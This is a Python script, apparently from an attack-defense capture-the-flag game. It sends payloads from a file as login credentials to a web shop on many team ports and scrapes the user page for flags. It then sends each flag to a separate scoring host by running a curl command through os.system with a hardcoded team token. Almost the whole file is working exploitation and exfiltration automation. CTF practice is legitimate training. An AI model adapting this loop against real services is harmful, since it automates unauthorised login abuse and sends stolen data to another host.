import requests
import os
import argparse
import time

parser = argparse.ArgumentParser()
parser.add_argument("--username", help="Username")
parser.add_argument("--password", help="Password")
parser.add_argument("--port", help="port")
args = parser.parse_args()
username = args.username
password = username
port = args.port


def recvall(s):
    total_data = []
    response = s.recv(4096)
    while (len(response) > 0):
        total_data.append(response.decode())
        response = s.recv(4096)
    response = ''.join(total_data)
    return response


s = requests.Session()
# data = {
#     "username":
#     r"52l3R+uzny+0Jx/fyJ8Rmqyus+rrlIq23jD5fyxnIoeV0Y3SCuVU5c+qwJkNkFPe6yLWXhXPRSe/o/J8JjIbHT1A2jXWJUn7Nc9Mt65InUDThhAfgxX6iCfb54FDF1eAMfm6nwUA0qpOiNCMB8pNVw==",
#     "password": "LqmtExxVMM8yXyj6NmvZ/Q=="
# }
# r = s.post("http://10.254.0.254:4021/index.php?page=login", data=data)

# print(r.request.body)
# print(r.text)
# res = s.get("http://10.254.0.254:4021/index.php?page=shop").text
# # print(res)
# admin = re.findall("<li><a href=\"index\.php\?page=user\">\w+", res)
# admin = admin[0][34:]
# print("admin username: " + admin)
f = open("payload.txt", "r")
while (True):
    port = f.readline().strip()
    if (port == ""):
        break
    payload1 = f.readline().strip()
    payload2 = f.readline().strip()
    s = requests.Session()
    data = {"username": payload2, "password": payload2}
    try:
        r = s.post("http://10.254.0.254:" + port + "/index.php?page=login",
               data=data)
        r = s.get("http://10.254.0.254:" + port + "/index.php?page=shop").text
    except:
        print("Error")
        continue
    #
    try:
        for i in range(len(r)):
            if (r[i:i + 34] == "<li><a href=\"index.php?page=user\">"):
                j = i + 34
                flag = ""
                while (r[j] != '<' and j < len(r)):
                    flag += r[j]
                    j += 1
                # print(flag)
                flag = flag.split(",")[-2:]
                for fl in flag:
                    payload = "curl -i -s -k -X 'PUT' -H 'Host: 10.254.0.253:8080' -H 'Accept-Encoding: gzip, deflate' -H 'Accept: /' -H 'Connection: close' -H 'X-Team-Token: d3c13df193ac6f28' -H 'Content-Length: 36' -H 'Content-Type: application/json' --data-binary '[\"" + fl + "\"]' 'http://10.254.0.253:8080/flags'"
                    os.system(payload)
                    time.sleep(1)
    except:
        print("Error")    

# data = {"username": username, "password": password}
# r = s.post("http://10.254.0.254:" + port + "/index.php?page=login", data=data)
# print(s.get("http://10.254.0.254:" + port + "/index.php?page=shop").text)
